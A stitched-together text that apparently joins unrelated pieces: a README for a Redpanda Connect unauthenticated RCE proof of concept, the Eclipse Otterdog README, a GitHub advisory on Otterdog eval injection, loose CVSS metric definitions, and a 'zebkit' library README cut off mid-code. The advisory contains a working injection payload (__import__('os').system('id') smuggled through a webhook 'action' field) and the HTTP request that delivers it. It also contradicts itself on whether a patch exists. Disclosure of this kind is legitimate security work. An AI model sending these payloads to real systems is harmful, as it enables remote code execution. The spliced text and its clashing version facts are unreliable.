# Redpanda Connect: Unauthenticated Streams-Mode RCE (CVE-2026-123270)

Advisory and proof-of-concept exploit for [CVE-2026-123270](https://www.cve.org/CVERecord?id=CVE-2026-123270), an unauthenticated remote code execution vulnerability in the Redpanda Connect (formerly Benthos) streams-mode management API. Coordinated through CERT/CC; tracked as CVE-2026-123270. ## Demo ![Unauthenticated RCE against Redpanda Connect v4.109.0: a single docker run verifies the official release binary, confirms the streams-mode management API is reachable without authentication, and executes id on the host over port 4195](assets/rp_connect_unauth_rce_demo.gif) The recording runs the PoC end to end against the official v4.109.0 binary inside a throwaway container. Step `[5]` shows the blind path (command output written to a file on the host) and step `[7]` shows the in-band path (command output returned directly in the HTTP response body). The `id` payload runs as the unprivileged service account the container starts as (`uid=1000(demo)`), confirming code execution as the Redpanda Connect process with no authentication. ## Summary When Redpanda Connect runs in streams mode (for example `redpanda-connect streams`), it exposes a management HTTP API on `0.0.0.0:4195` with authentication disabled by default. Any client that can reach port 4195 can create a stream with an unauthenticated `POST /streams/{id}`. Pipeline configs may contain code-executing processors such as `command` and `subprocess`, so an attacker can submit a pipeline whose processor runs an arbitrary command. Instantiating the stream executes attacker-controlled code on the host, with no authentication, credentials, or user interaction. The command output can be returned directly in the HTTP response body over the same management port, so execution is not limited to blind operation. This is a secure-by-default failure (CWE-306, Missing Authentication for Critical Function) that escalates to code execution (CWE-94 / OS command execution). It is a distinct issue from CVE-2026-82266, which affects the separate Redpanda broker Admin API on port 9644. See the [advisory](rp_connect_rce_advisory_CVE-2026-123270.md) for the full comparison. ## Exploit flow ## Affected versions Vulnerable by default on all releases up to and including v4.110.0. From v4.111.0 (2026-09-25) onward it is not vulnerable by default, though the same RCE is still reachable there if the management API is enabled with the `--bind-http` flag. See the [full advisory](rp_connect_rce_advisory_CVE-2026-123270.md) for the complete tested-version matrix (v4.39.0 through v4.117.0) and the details. ## Contents | File | Description | |---|---| | `rp_connect_rce_advisory_CVE-2026-123270.md` | Full advisory: root cause, source references, impact, remediation, and disclosure timeline. | | `rp_connect_rce_poc.py` | Self-contained Python 3 proof of concept. Standard library only, no third-party dependencies. | | `docker/` | Containerized version of the PoC used for the demo recording. Runs the target and exploit as an unprivileged service account. | ## Proof of concept The PoC downloads and checksum-verifies the official Redpanda Connect release binary, starts it in default streams mode, confirms the management API is reachable without authentication, and then demonstrates two execution paths: 1. Blind execution: an unauthenticated `POST /streams/{id}` runs a command whose output is written to a file on the host. 2. In-band execution: an `http_server` input paired with a `sync_response` output returns the command output directly in the HTTP response body. Run it against a local instance: ``` python3 rp_connect_rce_poc.py ``` By default it targets `http://127.0.0.1:4195`. Edit the `TARGET` constant in the script to point at another host. ### Run in a container (as recorded in the demo) The demo above runs the target and the PoC together inside a throwaway container, as an unprivileged, non-personal service account. This isolates the vulnerable service from your host and is the recommended way to reproduce the exploit. It is also why the `id` output in the recording reads `uid=1000(demo)` rather than a real user account. From the `docker/` directory: ``` docker build -t rp-connect-rce-demo . docker run --rm --hostname target rp-connect-rce-demo ``` `--rm` discards the container after each run, and `--hostname target` keeps the host machine name out of any command output. The image downloads and checksum-verifies the official release binary at build time, and the PoC re-verifies the same digest at run time. The build defaults to `linux_arm64`. On an x86_64 host, override the two build args with the `linux_amd64` asset and its published digest. This single swap covers both the build-time checksum and the runtime verification: ``` docker build \ --build-arg ASSET=redpanda-connect_4.109.0_linux_amd64.tar.gz \ --build-arg SHA256=b73c40bf7ebe6acf690d38aa50c57deec5c754dc08d1a85091679b663eab9f4a \ -t rp-connect-rce-demo . ``` See `docker/README.md` for details. ## Note CVE-2026-123270 was published on 2026-11-09 and fixed by the vendor. The captured proof-of-execution output and the reporter's contact email are redacted from this public copy. ## Author Adrian Pastor (GitHub: [@pagvac](https://github.com/pagvac)) ## License Released under the MIT License. See `LICENSE`.

readme:eclipse-csi/otterdog.text: # Eclipse Otterdog ## Introduction Otterdog is a tool to manage GitHub organizations at scale using a configuration as code approach. It is actively developed by the Eclipse Foundation and used to manage its numerous projects hosted on GitHub. ## Quickstart To install and use the cli part of otterdog you have to install the following: * git (mandatory): install using `apt install git` * otterdog (mandatory): install using `pipx install otterdog` * bitwarden cli tool (optional): install using `snap install bw` * pass cli tool (optional): install using `apt install pass` [Otterdog Presentation @ Open Source Summit 2023](https://docs.google.com/presentation/d/1lLqbhDQf9s5U2A2TkcoFYA39qtODcSot2308vnKbkbA/edit?usp=sharing) [Default Configuration used @ Eclipse Foundation](https://github.com/EclipseFdn/otterdog-defaults/) ## Documentation The documentation is available at [csi.eclipse.dev/otterdog](https://csi.eclipse.dev/otterdog/). ## Build instructions ### System requirements: * python3.11+ (mandatory): e.g. install using `apt install python3` or use `pyenv install 3.12` * git (mandatory): install using `apt install git` * poetry >=2 (mandatory): install using `pipx install poetry>=2.0.1` * bitwarden cli tool (optional): install using `snap install bw` * pass cli tool (optional): install using `apt install pass` ### Building Steps * Create a virtual python environment and install necessary python dependencies using poetry: ```console $ make init ``` Running `make init` will also install `poetry` if it is not installed yet. * Testing build ```console $ ./otterdog.sh -h ``` ## Quick Setup To start using the cli part of `otterdog` right away on a specific organization you have to set up the following: - define a default configuration to use, or use the following [default config](https://github.com/eclipse-csi/otterdog/blob/main/otterdog/resources/defaults/otterdog-defaults.libsonnet) right away - create a `otterdog.json` file that contains a list of GitHub organizations to manager and their respective credentials - start managing your organizations using the cli ### Default configuration The example [default config](https://github.com/eclipse-csi/otterdog/blob/main/otterdog/resources/defaults/otterdog-defaults.libsonnet) has all supported features enabled and can be used right away. However, reference a released tag or a commit SHA instead of `main` in `base_template`, the ref after `@` in the example below, to avoid incompatibilities and unreviewed changes. A branch is pulled on every run: every push to it changes the inherited values of your organizations and the [validation scripts](https://csi.eclipse.dev/otterdog/operating_otterdog/organization-policies/#enforce-settings-with-validation-scripts) that otterdog executes with your credentials. Otterdog logs a warning when `base_template` references a branch. ### Otterdog configuration Create a `otterdog.jsonnet` or `otterdog.json` file with the following content (replace bracketed values according to your setup): ```json { "defaults": { "jsonnet": { "base_template": "https://github.com/eclipse-csi/otterdog#otterdog/resources/defaults/otterdog-defaults.libsonnet@main", "config_dir": "orgs" } }, "organizations": [ { "name": "", "github_id": "", "credentials": { "provider": "plain", "api_token": "", "username": "", "password": "", "twofa_seed": "<2FA TOTP seed>" } } ] } ``` The name of the configuration file can be freely chosen (can be overridden with the __-c__ flag). However, when named `otterdog.jsonnet` or `otterdog.json`, the cli tool will automatically detect and use that file if it is in the current working directory. > [!IMPORTANT] > In this example the `plain` provider is being used to access credentials to avoid setting up a `real` credential provider (see below) for a quick setup. > However, the `plain` provider should *NOT* be used for anything else to avoid leakage of data in case the `otterdog.json` file is shared with other users. ### Environment Variables The full list of environment variables read by the cli is available in the [documentation](https://csi.eclipse.dev/otterdog/operating_otterdog/setup/#environment-variables). #### OTTERDOG_CONFIG_ROOT The `OTTERDOG_CONFIG_ROOT` environment variable allows you to specify a custom root directory for Otterdog configuration files and organization data. E.g: https://github.com/EclipseFdn/otterdog-configs When set, Otterdog will: - Search for configuration files (`otterdog.jsonnet` or `otterdog.json`) in this directory - Use this directory as the base path for the `config_dir` (default: `orgs/`) containing organization configurations **Usage:** ```bash # Set the configuration root directory export OTTERDOG_CONFIG_ROOT=/path/to/config # Run otterdog commands - will automatically use the specified directory otterdog fetch-config eclipse-csi otterdog apply eclipse-csi ``` #### OTTERDOG_WEB_TIMEOUT The `OTTERDOG_WEB_TIMEOUT` environment variable sets the timeout in milliseconds (default: `10000`) used by the web client when loading GitHub pages and waiting for elements. Increase it on slow connections if you get errors like `Page.goto: Timeout 10000ms exceeded`. **Usage:** ```bash export OTTERDOG_WEB_TIMEOUT=60000 otterdog plan eclipse-csi ``` ### Credentials Otterdog needs certain credentials to access information from an organization and its repositories on GitHub: * username / password / 2FA seed * API token The login / username / 2FA seed are required to access the web interface of GitHub in order to retrieve certain settings that are not accessible via its rest / graphql API. The GitHub api token needs to have the following scopes enabled: * repo * workflow * admin:org * admin:org_hook * delete_repo The credentials can be stored in different providers (bitwarden, pass). #### Bitwarden When using **bitwarden** to store the credentials, you need to enter a valid __item id__ as additional credential data: ```json { "organizations": [ { "name": "", "github_id": "", "credentials": { "provider": "bitwarden", "item_id" : "" } } ] } ``` The item stored in bitwarden needs to contain the following information (a sample json output of such an item): ```json { "object": "item", "id": "", "name": "", "fields": [ { "name": "api_token_admin", "value": "" } ], "login": { "username": "", "password": "", "totp": "<2FA TOTP seed>" } } ``` Mandatory items: * Field with name "api_token_admin" and as value the GitHub token to access the organization * __login.username__ of a user that can access the organization with enabled 2FA * __login.password__ the password of that user * __login.totp__ the 2FA TOTP seed #### Pass When using **pass** to store the credentials, you need to enter fully qualified pass names to access the various required credential data: ```json { "organizations": [ { "name": "", "github_id": "", "credentials": { "provider": "pass", "api_token": "", "username": "", "password": "", "twofa_seed": "" } } ] } ``` In case your password storage dir is not located at the default location, you can configurate that in the `defaults`: ```json { "defaults": { "pass": { "password_store_dir": "path/to/storage/dir" } } } ``` As the `password_store_dir` might be different on different machines, you can also customize that in a separate `.otterdog-defaults.json` file: ```json { "pass": { "password_store_dir": "path/to/storage/dir" } } ```

 Unauthenticated remote code execution via `eval()` on format-string-injected webhook body when `GITHUB_WEBHOOK_SECRET` is unset
 

 

 


 
 
 Critical
 
 

 
 heurtematte 
 published
 GHSA-32xf-7j44-xq72 
 Nov 9, 2026 

 
 
 
 


 

 
 
 
 
 
 
 
 
 
 Package 

 
 otterdog 
 

 
 Affected versions 

 >= 0.9.0, < 1.3.2 
 

 
 Patched versions 

 1.3.3 
 
 

 
 


 
 
 Description 
 

 
 
 Summary 
 The otterdog webapp evaluates a format-string built from the incoming GitHub webhook JSON body using Python's eval() . When the GITHUB_WEBHOOK_SECRET configuration value is unset or empty (the code default is None ), the HMAC signature check is skipped entirely, allowing an unauthenticated network client to reach the eval() sink with attacker-controlled input and execute arbitrary Python on the webapp host. 
 Impact 
 An unauthenticated remote attacker who can send HTTP requests to the webapp's webhook endpoint (default POST /github-webhook/receive , bound on 0.0.0.0:5000 in the shipped container configuration) can execute arbitrary code as the webapp process. The attack requires that the deployment has not set GITHUB_WEBHOOK_SECRET ; the documented deployment procedure ( TESTING.md ) instructs setting it, but the application starts without warning when it is absent and the signature check silently becomes a no-op. With a non-empty secret correctly configured, only GitHub can produce a valid signature and GitHub's action field is drawn from a fixed enum of safe values, so the injection is not reachable. 
 Affected versions 
 
 All versions of the otterdog webapp (source checkout or ghcr.io/eclipse-csi/otterdog container deployment) up to and including current main . 
 The otterdog package on PyPI is not affected : otterdog/webapp is explicitly excluded from the published wheel ( pyproject.toml exclude = ["otterdog/app.py", "otterdog/webapp"] ). 
 
 Patched versions 
 Not yet patched. No fix commit is present on the default branch. 
 Proof of concept 
 The sink at github_webhook.py:160 builds an expression by substituting the request body's action field into a single-quoted template and passes the result to eval() : 
 EVENT_FILTER = { "workflow_job" : "'{action}' == 'queued'" }
 data = { "action" : "' + str(__import__('os').system('id > /tmp/otterdog_f2')) + '" }
 expr = EVENT_FILTER [ 'workflow_job' ]. format ( ** data )
 print ( 'expr:' , expr ) # '' + str(__import__('os').system('id > /tmp/otterdog_f2')) + '' == 'queued' 
 print ( 'eval ->' , eval ( expr ))
 print ( open ( '/tmp/otterdog_f2' ). read ()) # uid=1000(...) gid=1000(...) ... 
 End-to-end against a deployment with no GITHUB_WEBHOOK_SECRET configured: 
 POST /github-webhook/receive HTTP/1.1
Content-Type: application/json
X-Github-Event: workflow_job
X-Github-Delivery: x

{"action": "' + __import__('os').system('id') + '", "workflow_job": {"name":"x","labels":[]}, "repository":{"full_name":"x"}}
 
 _log_event is called before pydantic validation of the event model, so the body need not be a fully valid WorkflowJobEvent . 
 Fix suggestion 
 Replace the eval(EVENT_FILTER[event_type].format(**data)) construction at github_webhook.py:160 with a plain dict-of-callables lookup, e.g. EVENT_FILTER = {"workflow_job": lambda d: d.get("action") == "queued", ...} . Separately, fail closed at startup when GITHUB_WEBHOOK_SECRET is None or empty so that signature verification cannot be silently skipped. 
 References 
 
 https://github.com/eclipse-csi/otterdog/blob/main/otterdog/webapp/webhook/github_webhook.py#L152-L162 — the vulnerable EVENT_FILTER / eval() sink 
 https://cwe.mitre.org/data/definitions/95.html — CWE-95: Improper Neutralization of Directives in Dynamically Evaluated Code ('Eval Injection')

 This metric reflects the context by which vulnerability exploitation is possible. This metric value (and consequently the resulting severity) will be larger the more remote (logically, and physically) an attacker can be in order to exploit the vulnerable system. The assumption is that the number of potential attackers for a vulnerability that could be exploited from across a network is larger than the number of potential attackers that could exploit a vulnerability requiring physical access to a device, and therefore warrants a greater severity. 
 
 
 Attack Complexity: 
 This metric captures measurable actions that must be taken by the attacker to actively evade or circumvent existing built-in security-enhancing conditions in order to obtain a working exploit. These are conditions whose primary purpose is to increase security and/or increase exploit engineering complexity. A vulnerability exploitable without a target-specific variable has a lower complexity than a vulnerability that would require non-trivial customization. This metric is meant to capture security mechanisms utilized by the vulnerable system. 
 
 
 Attack Requirements: 
 This metric captures the prerequisite deployment and execution conditions or variables of the vulnerable system that enable the attack. These differ from security-enhancing techniques/technologies (ref Attack Complexity) as the primary purpose of these conditions is not to explicitly mitigate attacks, but rather, emerge naturally as a consequence of the deployment and execution of the vulnerable system.

 This metric describes the level of privileges an attacker must possess prior to successfully exploiting the vulnerability. The method by which the attacker obtains privileged credentials prior to the attack (e.g., free trial accounts), is outside the scope of this metric. Generally, self-service provisioned accounts do not constitute a privilege requirement if the attacker can grant themselves privileges as part of the attack.

 This metric captures the requirement for a human user, other than the attacker, to participate in the successful compromise of the vulnerable system. This metric determines whether the vulnerability can be exploited solely at the will of the attacker, or whether a separate user (or user-initiated process) must participate in some manner.

Confidentiality refers to limiting information access and disclosure to only authorized users, as well as preventing access by, or disclosure to, unauthorized ones.

 This metric measures the impact to integrity of a successfully exploited vulnerability. Integrity refers to the trustworthiness and veracity of information. Integrity of the VULNERABLE SYSTEM is impacted when an attacker makes unauthorized modification of system data. Integrity is also impacted when a system user can repudiate critical actions taken in the context of the system (e.g. due to insufficient logging).

While the Confidentiality and Integrity impact metrics apply to the loss of confidentiality or integrity of data (e.g., information, files) used by the system, this metric refers to the loss of availability of the impacted system itself, such as a networked service (e.g., web, database, email). readme:ikey4u/zebkit.text:
Chrome as a library — light, fast, everywhere, and easy.
One API on Linux, macOS and Windows. Add it in a few lines.

## Introduction zebkit is Chromium's engine as one library you link into your own application: Blink, V8 with every JIT tier, PDFium, FFmpeg and the rest of what Chrome is made of, with nothing of Chrome's browser and nothing of Electron's runtime. Your application stays yours, in C, C++, Rust, Python, Go or JavaScript, with its own windows and toolkit. Where it needs the web, it adds a zebkit view; where it needs a PDF, media, compression or crypto, it calls zebkit's API: in C, or through the bindings for Rust, Python, Go and JavaScript (`zebkit-js`, and `zebkit.*` in the application's own pages).

- **Integrate it, don't build on it.** Electron is a base: an application is built inside it, on its runtime, its windows and its packaging. zebkit is a part: an application adds it, as it adds SQLite, and keeps its process, its toolkit and its way of shipping. It runs inside the application's own event loop (`zebkit_init()`, `zebkit_pump()`), and draws in the application's windows, as frames you draw or in a child of a window you give it, an X11 window, an `NSView` or an `HWND` (`examples/native-host`), and gives back the window a page is in for the system's dialogs. - **Take what you need.** Web views, in a window or off-screen with their frames handed to you; a full PDF API; saving what a page plays; your own URL schemes; native UI from JavaScript; Playwright's API and CDP for agents. Use one, or all. - **The real Chrome engine.** Pages see Chromium 157: its user agent and client hints, `window.chrome`, popups blocked without a click, and nothing of a debugger attached (`docs/API.md` has what still differs, Google's sign-in among it). - **Lighter than Electron.** Against the latest Electron, 45.2.1: 34% smaller, a cold start in 2.3 s against 6.6, a page in 29% less memory, and the DOM, text layout and JavaScript level ([Benchmark](#benchmark)). - **No Node.** No second JavaScript runtime and no IPC through one. The application is native code, or JavaScript run by `zebkit-js` on the engine's V8. - **Chromium's libraries are yours.** 17 C libraries inside the engine, about 7,490 functions on each of Linux, macOS and Windows (7,487 on all three, the rest each system's own), exported under `zebkit_vendor_*`: SQLite, LevelDB, BoringSSL, zlib, Zstandard, Brotli, ICU, HarfBuzz, libxml2, libwebp, libjpeg-turbo, FFmpeg, dav1d, Opus, libvpx, FreeType and PDFium. You do not ship them twice. - **PDF built in.** A full API on Chromium's PDFium: rendering and tiles, text with layout, search, outline, links, annotations as an editor has them (line endings, cloudy borders, free text with callouts and rich text, stamps, replies and states, measurement, XFDF and FDF), forms, redaction, page editing, merging, attachments, metadata, and signatures checked for integrity; hooks for an application's own annotation kinds, appearances, events with undo, render layers, OCR, fonts, trust and actions. In C, Rust, Python and JavaScript. - **2D drawing and shaping.** `` on the engine's Skia and `` on its HarfBuzz, without shipping either again. - **Media, saved as it plays.** Whatever a page plays, a file, MSE/DASH or HLS, written to MP4 or WebM as it was sent, without re-encoding and without a second download (``). - **Bytes as they are.** A page's calls to the application go over its frame's own Mojo channel, large ones through shared memory: no base64, the page's JSON handed on as it was written, as fast as Electron's IPC for small calls and faster for large ones. - **The window around a page, from JavaScript.** `zebkit.ui` draws windows, prompts and dialogs with Chromium's views toolkit: signals, JSX, Tailwind classes, and automation for tests and agents. Rich UI is a page; `zebkit.ui` is the chrome around it (`docs/UI.md`). - **Playwright's API, natively.** The whole of Playwright (locators, actions that wait until they can be done, keyboard, mouse and touch, routes, dialogs, downloads, contexts, workers, traces, HAR, video) runs inside the engine, without CDP or a Node.js driver: 3 to 10 times faster than Playwright over CDP, and a click in 3 to 5 ms instead of 33 (``, `docs/AUTOMATION.md`). Playwright's own clients, in any of its languages, connect to it unchanged with `chromium.connect()`. - **Made for agents.** `tools/zebkit-mcp` gives them pages, PDFs, files, media and native windows as MCP tools, over standard input and HTTP, within bounds its operator sets (`docs/MCP.md`). They can also drive zebkit through Playwright's API or over CDP, Chromium's own DevTools server, headless or windowed. - **Customise it from your code, down to the desktop.** Native hooks decide what the engine does, in C, Rust, Python and JavaScript: permissions, navigation, popups, dialogs, downloads, certificates and client certificates, sign-in, network requests and responses at every stage, settings at run time, your own URL schemes, what a page may call, scripts before the page's own (`docs/ROADMAP_HOOKS.md`). And everything a page or the engine would show the person or ask of the system goes through the application: the window's frame (system, overlay or none, with the page as the title bar), menus and the context menu, JavaScript dialogs and sign-in, file and device choosers, screen capture, notifications, the tray, the Dock and taskbar, sharing, the system's theme, power and displays ([Fit it into the desktop](#fit-it-into-the-desktop), `docs/SYSTEM_INTEGRATION.md`). - **Safe by default.** A page has no `zebkit` object unless the application grants it, per view, per origin and per capability; the origin is the browser's, never the page's word; the renderer stays sandboxed; permissions a browser would ask about are not granted. | | | |---|---| | Engine | Chromium 157.0.8103.38 (`upstream.lock`): content layer, Blink, V8 with every JIT tier | | Linux | x86-64, glibc 2.17 or newer (CentOS 7 and later), X11 and (`--ozone-platform=wayland`) Wayland: `libzebkit.so.1` and `zebkit-helper` | | macOS | Apple silicon: `Zebkit.framework`, built natively or cross-built on Linux (`docs/MACOS.md`) | | Windows | x64, Windows 10 or newer: `zebkit.dll` and `zebkit-helper.exe`, cross-built on Linux (`docs/WINDOWS.md`) | | Version | `VERSION`: 0.4.0 | ## Quick start ### Get the engine A package is a directory with the library, the helper, the engine's data and `include/`. Either unpack a release's archive (`zebkit--.tar.xz` from GitHub's releases), or build one: ```sh mise run r # dist/release (Linux), dist/release-macos (macOS), dist/release-windows; hours the first time ``` Each archive also holds the tools, built for its system beside the library and ready to run from where it is unpacked: `zebkit-run`, `zebkit-js` and `zebkit-mcp` (`.exe` on Windows, sandboxed there too). On an Apple silicon Mac with full Xcode installed, `scripts/dist.sh release` builds the engine locally into `dist/release`. Then run `scripts/example.sh macos-basic` to build and launch the C embedding demo in `dist/example/Zebkit Embedded Browser.app`. Building needs about 30 GB for Chromium's tree (`docs/BUILD.md`). Below, `$PKG` is the package directory. ### Add it to a program you already have zebkit is a library: your program keeps its `main()` and calls it. This one renders a PDF's first page to a PNG and reads its text, with PDFium and the image encoders inside zebkit, and nothing else to install: ```c #include #include #include /* Your program, your main(): zebkit is just a library it calls. */ int main(int argc, char **argv) { char *error = NULL; zebkit_pdf *pdf = zebkit_pdf_open_file(argv[1], NULL, &error); if (!pdf) { fprintf(stderr, "%s\n", error); return 1; } /* The first page as a PNG, at twice its size. */ zebkit_pdf_render_options options = {.scale = 2, .background = 0xffffffff}; int width, height; uint8_t *rgba = zebkit_pdf_render(pdf, 0, &options, &width, &height, &error); size_t size; uint8_t *png = zebkit_image_encode(ZEBKIT_IMAGE_PNG, rgba, width, height, 0, &size, &error); fwrite(png, 1, size, fopen("page1.png", "wb")); /* And its text. */ char *text = zebkit_pdf_text(pdf, 0, &error); printf("%d pages; page 1 says: %.80s\n", zebkit_pdf_page_count(pdf), text); zebkit_free(text), zebkit_free(png), zebkit_free(rgba); zebkit_pdf_close(pdf); return 0; } ``` ```sh cc thumb.c -I$PKG/include -L$PKG -l:libzebkit.so.1 -Wl,-rpath,$PKG -o thumb # Linux cc thumb.c -I$PKG/include -F$PKG -framework Zebkit -Wl,-rpath,$PKG -o thumb # macOS ./thumb report.pdf # 2 pages; page 1 says: Quarterly report ... ``` The PDF API, compression, crypto, URLs, image codecs, ICU and the libraries inside the engine (`zebkit_vendor_*`, FFmpeg's among them) need no engine loop (`docs/API.md`); only HTTP through the engine's network stack and web pages do. ### Add a web view Web pages need the engine running. Here the engine runs the loop: the program starts it with `zebkit_main()` and works in its callbacks. A program with its own loop (GTK, Qt, AppKit, winit) starts it with `zebkit_init()` and calls `zebkit_pump()` (`examples/native-host`). ```c #include #include static void printed(zebkit_view *view, const char *json, const char *error, void *data) { printf("%s\n", json ? json : error); zebkit_quit(); } static void loaded(zebkit_view *view, zebkit_load_event event, const char *url, void *data) { if (event == ZEBKIT_LOAD_FINISHED) zebkit_view_evaluate(view, "document.title", printed, NULL); } static void ready(void *data) { zebkit_view *view = zebkit_view_new("https://example.com/", 1024, 768); zebkit_view_on_load(view, loaded, NULL); } int main(int argc, char **argv) { return zebkit_main(argc, argv, ready, NULL); } ``` ```sh cc app.c -I$PKG/include -L$PKG -l:libzebkit.so.1 -Wl,-rpath,$PKG -o app # Linux cc app.c -I$PKG/include -F$PKG -framework Zebkit -Wl,-rpath,$PKG -o app # macOS clang-cl /MT app.c /I%PKG%\include %PKG%\zebkit.dll.lib %PKG%\zebkit_sandbox.lib # Windows ./app --remote-debugging-port=9222 # with CDP for Puppeteer and Playwright ``` On Windows the executable takes part in Chromium's sandbox: it links `zebkit_sandbox.lib` and calls `zebkit_win_startup()` first in `main()` (`docs/WINDOWS.md`). Without unprivileged user namespaces the engine refuses to start and says why: install its helper, or in a container of its own add `--no-sandbox` (`docs/SANDBOX.md`). ### The page and the application The application serves its own pages from a scheme and gives them functions to call; a page has nothing of `zebkit` unless it is granted. ```c /* The page calls zebkit.app.greet("Ada"). */ static void greet(zebkit_view *view, const char *origin, const char *args_json, zebkit_call *call, void *data) { char answer[256]; snprintf(answer, sizeof answer, "{\"hello\": %s}", args_json); zebkit_call_resolve(call, answer); } /* app://main/... from ./ui, in ranges for media. A real handler refuses "..". */ static void serve(zebkit_request *request, void *data) { char path[1024]; snprintf(path, sizeof path, "ui%s", zebkit_request_url(request) + sizeof "app://main" - 1); zebkit_request_respond_file(request, path, NULL); } static void closed(zebkit_view *view, void *data) { zebkit_quit(); } static void ready(void *data) { zebkit_view *view = zebkit_view_new("app://main/index.html", 1024, 768); zebkit_view_grant(view, "app://main", ZEBKIT_ALLOW_APP | ZEBKIT_ALLOW_PDF, NULL); zebkit_view_bind(view, "greet", greet, NULL); zebkit_view_on_close(view, closed, NULL); } int main(int argc, char **argv) { zebkit_scheme_register("app", ZEBKIT_SCHEME_STANDARD | ZEBKIT_SCHEME_SECURE | ZEBKIT_SCHEME_FETCH); zebkit_scheme_handle("app", serve, NULL); return zebkit_main(argc, argv, ready, NULL); } ``` In the page, every call is a promise and bytes are `Uint8Array`s: ```js const reply = await zebkit.app.greet('Ada'); // the application's function const pdf = await zebkit.pdf.open(await (await fetch('report.pdf')).bytes()); const rgba = await pdf.render(0, {scale: 2}); // a page as pixels const hits = await pdf.search('revenue'); const packed = await zebkit.compress('zstd', bytes, 19); const hash = await zebkit.crypto.digest('SHA-256', 'abc'); ``` ### Fit it into the desktop Each thing the engine would show the person, or ask of the system, has a default that works and a function of the application's that replaces it. Nothing reaches the system without a decision the application can take; without a function, a page gets what a careful browser gives it, and nothing at all where a browser would ask. ```python import zebkit zebkit.scheme_register("app") # served by a scheme_handle(), as in the C example above zebkit.init(["app"]) # The page is the title bar: the window's buttons over it, dragged by its CSS. view = zebkit.View("app://main/index.html", 1000, 700, options={ "frame": "overlay", "controls": {"height": 40, "color": "#1b1d2a", "symbolColor": "#ffffff"}, "dragRegions": {"source": "css", "origins": ["app://main"]}}) # The application's menu bar (macOS) and keys, with state that changes in place. zebkit.app_set_menu([{"title": "File", "items": [{"title": "Autosave", "id": "autosave", "checked": True}]}], lambda item: zebkit.app_update_menu_item(item, checked=False)) # A tray icon, the Dock's or the taskbar's badge, and the page's notifications as the application's. tray = zebkit.Tray(open("icon.png", "rb").read(), "My application") zebkit.app_set_badge("3") zebkit.on_notification(lambda event: print("show in my own UI:", event)) # What a page asks for: a USB device, a screen to capture, a colour, a share. view.on_device_chooser(lambda request: request.respond(request.metadata["devices"][0]["id"])) view.on_media_access(lambda request: request.respond(True, None, "view")) view.on_share(lambda request: request.respond(True)) # The system: its theme and its changes, the session's lock, the screens. zebkit.on_environment_changed(lambda env: print("dark" if env["colorScheme"] == "dark" else "light")) zebkit.on_power_event(lambda event: print(event["event"])) # suspend, resume, lock, unlock print(zebkit.displays()) ``` | | The default | The application's | |---|---|---| | Window frame | the system's | `overlay` (Window Controls Overlay) or `none`, title, colours, drag regions, state, actions | | Menus | the menu bar on macOS; the default context menu | items with state by id; the context menu replaced, extended or run | | Dialogs | the system's alerts; the engine's prompt and sign-in where there is a window | `zebkit_view_on_dialog`, `on_http_auth`, `on_client_certificate`, the eye dropper | | Files and devices | the system's file dialog; no device | the file chooser and File System Access; WebUSB, WebHID and Web Serial choosers | | Capture and media | camera and microphone by permission; no screen | `getDisplayMedia()`'s source: the view itself or the screen | | Notifications | undecided; then the system's own service | shown in the application's UI, with clicks and closes back to the page | | Desktop | none | the tray, the Dock's and the taskbar's badge, progress and attention, the Dock menu, Web Share, opening URLs and folders | | The system | a light page | the system's dark mode and contrast followed live; power, lock and display events; keeping awake | `docs/SYSTEM_INTEGRATION.md` has each surface, its default, its status on each system and why; `docs/API.md` has the calls in the four languages; `examples/custom-titlebar` is a window whose title bar is the page. ### Rust [`zebkit`](https://crates.io/crates/zebkit) on crates.io, with [`zebkit-build`](https://crates.io/crates/zebkit-build) to put the engine beside your program; the build downloads the engine for your system once and checks its SHA-256. ```toml [dependencies] zebkit = "0.4.0" [build-dependencies] zebkit-build = "0.4.0" ``` ```rust // build.rs: puts the engine beside the executable fn main() { zebkit_build::bundle(); } // main.rs fn main() { std::process::exit(zebkit::run(|| { let view = zebkit::View::new(Some("https://example.com/"), 1024, 768); view.grant("https://example.com", zebkit::Allow::APP, None); view.bind("greet", |call| { let answer = format!("\"hello, {}\"", call.args_json()); call.resolve(&answer) }); view.on_close(zebkit::quit); })); } ``` `ZEBKIT_DIR` points the build at a package (`bindings/rust/README.md`). ### Python [`zebkit`](https://pypi.org/project/zebkit/) on PyPI is the binding; the engine is the archive for your system from the [releases](https://github.com/ikey4u/zebkit/releases) of the same version, with `ZEBKIT_DIR` pointing at it: ```sh pip install zebkit export ZEBKIT_DIR=/path/to/zebkit-0.4.0-x86_64-unknown-linux-gnu ``` ```python import zebkit # pure Python on ctypes: nothing to compile def ready(): view = zebkit.View("https://example.com/") view.grant("https://example.com", zebkit.ALLOW_APP) view.bind("greet", lambda name, origin: f"hello, {name}") zebkit.main(ready) # the engine is found in $ZEBKIT_DIR ``` ### Go [`bindings/golang`](bindings/golang), on cgo: views, pages calling Go functions, the application's schemes, the page hooks and the system's services, on Linux and macOS. Build with the engine's headers and library: ```sh go get github.com/ikey4u/zebkit/bindings/golang@main export CGO_CFLAGS="-I$ZEBKIT_DIR/include" CGO_LDFLAGS="-L$ZEBKIT_DIR -Wl,-rpath,$ZEBKIT_DIR" ``` ```go os.Exit(zebkit.Main(func() { view := zebkit.NewView("", 1024, 768) view.Grant("https://example.com", zebkit.AllowApp, "") view.Bind("greet", func(call *zebkit.Call) { call.Resolve(fmt.Sprintf("\"hello, %s\"", call.Args)) }) view.OnClose(zebkit.Quit) view.Load("https://example.com/") })) ``` ### JavaScript, without Node `zebkit-js` runs an ES module on the engine's V8, for applications written in JavaScript, with views, the same APIs, and native windows: ```js // zebkit-js main.mjs const view = new zebkit.View('app://main/index.html', {width: 1024, height: 768}); view.grant('app://main', ['app', 'pdf']); view.bind('save', async (name, text) => { await zebkit.fs.writeFile(`${zebkit.args[0]}/${name}`, text); return {saved: true}; }); view.on('close', () => zebkit.quit()); ``` ```js // zebkit-js examples/ui/todo.mjs: a window of native widgets, styled with // Tailwind's classes and kept up to date by signals (an excerpt) const {h, signal, computed, For, window} = zebkit.ui; const [tasks, setTasks] = signal([]); const done = computed(() => tasks().filter((t) => t.done).length); const Task = (task) => h('view', {class: 'flex-row items-center gap-3 p-3 rounded-xl bg-[#141a2e]'}, h('button', {class: 'w-8 h-8 p-0 rounded-full bg-[#7c5cff] text-white', onClick: () => toggle(task)}, task.done ? '✓' : ''), h('text', {class: 'grow text-[#e6e8f2]'}, task.text)); window({title: 'Today', width: 460, height: 680}, () => h('view', {class: 'flex-col gap-4 p-6 bg-[#0b1020]'}, h('text', {class: 'text-3xl font-bold text-white'}, 'Ship something great'), h('text', {class: 'text-sm text-[#8a91aa]'}, () => `${done()} of 